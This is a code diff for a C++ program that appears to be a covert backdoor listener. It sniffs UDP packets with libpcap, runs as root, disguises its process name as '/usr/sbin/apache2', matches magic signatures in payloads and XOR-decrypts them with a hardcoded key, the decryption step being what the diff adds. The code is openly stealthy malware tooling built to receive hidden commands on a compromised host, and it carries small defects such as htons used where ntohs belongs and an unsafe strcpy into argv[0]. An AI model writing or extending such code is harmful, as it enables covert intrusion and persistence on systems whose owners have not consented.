@@ -5,15 +5,22 @@
 #include <unistd.h>
 #include <netinet/if_ether.h>
 #include <netinet/ip.h>
+#include <netinet/udp.h>
 
 #include <pcap/pcap.h>
 
+
 constexpr std::string_view FAKE_PROCESS_NAME = "/usr/sbin/apache2";
-constexpr unsigned int HEADERS_SIZE = sizeof(struct pcap_pkthdr);
+constexpr uint HEADERS_SIZE = sizeof(struct pcap_pkthdr);
 
 constexpr uint ETHERNET_HEADER_SIZE = 14;
 constexpr uint UDP_HEADER_SIZE = 8;
+
 constexpr std::string_view SIGNATURE_ONE = "cr49s";
+constexpr std::string_view SIGNATURE_TWO = "32pld";
+constexpr uint SIGNATURE_SIZE = 5;
+
+constexpr std::string_view KEY = "@DNJI(HSNA872w";
 
 
 static pcap_if_t * findDevice()
@@ -35,20 +42,37 @@ static pcap_if_t * findDevice()
 };
 
 
+static void decrypt(const u_char encrypted[], unsigned char decrypted[], uint size)
+{
+	for (size_t i = 0; i < size; i++) {
+		decrypted[i] = encrypted[i] ^ KEY[i % KEY.length()];
+	}
+}
+
+
 void process_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
 {
 	std::cout << "Packet received" << std::endl;
 
 	const ip* ip_header = (ip*)(packet + ETHERNET_HEADER_SIZE);
 	const uint ip_header_len = ip_header->ip_hl * 4;
-	const uint total_header_size = sizeof(struct ether_header) + ip_header_len + UDP_HEADER_SIZE;
+
+	const udphdr *udp_header = (udphdr*)(packet + ETHERNET_HEADER_SIZE + ip_header_len);
+	const uint udp_len = htons(udp_header->uh_ulen);
+
+	const uint total_header_size = ETHERNET_HEADER_SIZE + ip_header_len + UDP_HEADER_SIZE;
 
 	const u_char* payload = packet + total_header_size;
 	if (memcmp(payload, SIGNATURE_ONE.data(), strlen(SIGNATURE_ONE.data())) != 0) {
 		std::cout << "Payload has no proper signature" << std::endl;
 		return;
 	}
-	std::cout << "Payload signature correct" << std::endl;
+
+	uint encrypted_size = udp_len - SIGNATURE_SIZE - UDP_HEADER_SIZE;
+	unsigned char decrypted[encrypted_size];
+	decrypt(payload + SIGNATURE_SIZE, decrypted, encrypted_size);
+	std::string decrypted_string (reinterpret_cast<const char*>(decrypted), encrypted_size);
+	std::cout << "Decrypted message: " <<  decrypted_string << std::endl;
 }
 
 
@@ -56,7 +80,6 @@ int main(int argc, char* argv[]) {
 
 	setuid(0);
 	setgid(0);
-
 	prctl(PR_SET_NAME, FAKE_PROCESS_NAME, 0, 0, 0);
 	strcpy(argv[0], FAKE_PROCESS_NAME.data());
 
@@ -65,7 +88,6 @@ int main(int argc, char* argv[]) {
 		std::cout << "Error : findDevice" << std::endl;
 		return 1;
 	}
-	std::cout << device->name << std::endl;
 
 	char buf[PCAP_ERRBUF_SIZE];
 	pcap_t* handler = pcap_open_live(device->name, 65536, 0, 1, buf);
